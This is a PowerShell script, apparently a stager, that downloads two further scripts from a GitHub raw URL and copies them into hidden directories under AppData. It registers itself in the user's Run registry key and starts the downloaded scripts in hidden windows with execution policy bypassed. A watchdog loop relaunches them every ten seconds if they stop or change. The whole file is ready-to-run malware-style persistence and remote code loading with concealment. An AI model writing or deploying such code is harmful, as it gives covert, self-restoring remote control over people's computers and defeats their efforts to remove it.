# A.ps1

# --- 設定 ---

$SpreadDirs = @(
    "$env:APPDATA\Microsoft\Windows",
    "$env:LOCALAPPDATA\TempData",
    "$env:APPDATA\Packages",
    "$env:LOCALAPPDATA\Packages",
    "$env:APPDATA\RoamingData",
    "$env:LOCALAPPDATA\RoamingData"
)

$Urls = @{
    "B" = "https://raw.githubusercontent.com/YourRepo/OrgScripts/main/B.ps1"
    "C" = "https://raw.githubusercontent.com/YourRepo/OrgScripts/main/C.ps1"
}

$RegNameA = "OrgScriptA"

# --- 関数群 ---

function SetHiddenAttribute($path) {
    if (Test-Path $path) {
        attrib +h $path
    }
}

function Get-FileSHA256($path) {
    if (Test-Path $path) {
        return (Get-FileHash -Path $path -Algorithm SHA256).Hash
    }
    return $null
}

function DownloadFileTemp($url, $tempPath) {
    try {
        Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $tempPath -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}

function StartupCheckAndRestore($fileName, $url) {
    $tempFile = Join-Path $env:TEMP "$fileName.tmp"
    $localPaths = $SpreadDirs | ForEach-Object { Join-Path $_ $fileName }

    if (-not (DownloadFileTemp $url $tempFile)) {
        return $localPaths[0]
    }

    $remoteHash = Get-FileSHA256 $tempFile

    foreach ($localFile in $localPaths) {
        if (-not (Test-Path $localFile)) {
            Copy-Item -Path $tempFile -Destination $localFile -Force
            SetHiddenAttribute $localFile
        } else {
            $localHash = Get-FileSHA256 $localFile
            if ($localHash -ne $remoteHash) {
                Copy-Item -Path $tempFile -Destination $localFile -Force
                SetHiddenAttribute $localFile
            }
        }
    }

    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue

    return $localPaths[0]
}

function IsScriptRunning($scriptName) {
    $procs = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | Where-Object {
        $_.CommandLine -like "*$scriptName*"
    }
    return $procs
}

function StopScriptProcesses($scriptName) {
    $procs = IsScriptRunning $scriptName
    foreach ($proc in $procs) {
        Stop-Process -Id $proc.ProcessId -Force -ErrorAction SilentlyContinue
    }
}

function StartHiddenScript($scriptPath) {
    $scriptName = [System.IO.Path]::GetFileName($scriptPath)
    if ((IsScriptRunning $scriptName).Count -eq 0) {
        Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`""
    }
}

function IsStartupRegistered($name) {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $val = Get-ItemProperty -Path $regPath -Name $name -ErrorAction SilentlyContinue
    return $null -ne $val
}

function RegisterStartup($name, $scriptPath) {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $quotedPath = "`"$scriptPath`""
    try {
        Set-ItemProperty -Path $regPath -Name $name -Value $quotedPath
    } catch {}
}

function CheckAndReRegisterStartup($name, $scriptPath) {
    if (-not (IsStartupRegistered $name)) {
        RegisterStartup $name $scriptPath
    }
}

# 隠しディレクトリがなければ作成＆隠し属性付与
foreach ($dir in $SpreadDirs) {
    if (-not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
        attrib +h $dir
    }
}

# 起動時にBとCの最新コードを復元・取得
$PathB = StartupCheckAndRestore "B.ps1" $Urls["B"]
$PathC = StartupCheckAndRestore "C.ps1" $Urls["C"]

# スタートアップ登録
CheckAndReRegisterStartup $RegNameA $MyInvocation.MyCommand.Path

# 監視対象スクリプトのハッシュ保持用
$MonitorScripts = @{
    "B.ps1" = Get-FileSHA256 $PathB
    "C.ps1" = Get-FileSHA256 $PathC
}

$MonitorPaths = @{
    "B.ps1" = $PathB
    "C.ps1" = $PathC
}

# 監視ループ：ハッシュ変化検知で再起動、停止や未起動なら起動
while ($true) {
    foreach ($script in $MonitorScripts.Keys) {
        $currentPath = $MonitorPaths[$script]
        $currentHash = Get-FileSHA256 $currentPath

        if ($currentHash -ne $MonitorScripts[$script]) {
            # プロセス停止
            StopScriptProcesses $script

            # 最新ファイルで起動
            StartHiddenScript $currentPath

            # ハッシュ更新
            $MonitorScripts[$script] = $currentHash
        } else {
            # プロセス存在チェック、なければ起動
            if ((IsScriptRunning $script).Count -eq 0) {
                StartHiddenScript $currentPath
            }
        }
    }
    Start-Sleep -Seconds 10
}
